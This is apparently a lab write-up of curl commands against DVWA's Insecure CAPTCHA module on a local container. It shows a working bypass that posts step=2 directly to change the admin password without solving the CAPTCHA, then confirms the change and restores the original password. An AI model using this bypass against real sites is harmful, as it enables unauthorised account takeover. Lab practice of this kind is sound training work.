# Commands — Insecure CAPTCHA Lab

## 1. Authenticate and establish session

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 2. Initial recon — CAPTCHA widget not rendering

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/captcha/" -o captcha_page.html
grep -i "recaptcha api key missing" captcha_page.html
```

**Result:** Warning present — `reCAPTCHA API key missing from config file`. Confirmed via:

```bash
docker exec dvwa cat /var/www/html/config/config.inc.php | grep -i recaptcha
```

```
$_DVWA[ 'recaptcha_public_key' ]  = '';
$_DVWA[ 'recaptcha_private_key' ] = '';
```

## 3. Populate reCAPTCHA test keys (to properly exercise the flow)

Google publishes fixed test keys for exactly this purpose — they always render a working (auto-passing) widget:

```bash
docker exec dvwa bash -c "cat >> /var/www/html/config/config.inc.php << 'EOF'
\$_DVWA[ 'recaptcha_public_key' ]  = '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI';
\$_DVWA[ 'recaptcha_private_key' ] = '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe';
EOF"

docker restart dvwa
```

Re-authenticate (container restart clears in-memory session state):

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 4. Exploit — skip CAPTCHA by submitting step=2 directly

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/captcha/" \
  -d "step=2&password_new=hacked123&password_conf=hacked123&Change=Change" \
  -o captcha_exploit_result.html
```

**Payload:** `step=2&password_new=hacked123&password_conf=hacked123&Change=Change`

No `g-recaptcha-response` field was included, and no CAPTCHA challenge was ever solved.

## 5. Validate impact — confirm the password actually changed

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -s -b cookies.txt -c cookies.txt http://localhost:4280/login.php \
  -d "username=admin&password=hacked123&Login=Login&user_token=$TOKEN" \
  -o login_result.html -w "%{http_code} -> %{redirect_url}\n"
```

**Result:** `302 -> index.php` — login succeeded with the new password, confirming the bypass worked.

## 6. Restore original credentials (reusing the same bypass)

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/captcha/" \
  -d "step=2&password_new=password&password_conf=password&Change=Change" \
  -o reset_pw2.html

# Verify restoration
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -s -b cookies.txt -c cookies.txt http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html -w "%{http_code} -> %{redirect_url}\n"
```

**Result:** `302 -> index.php` — original credentials (`admin`/`password`) restored successfully.
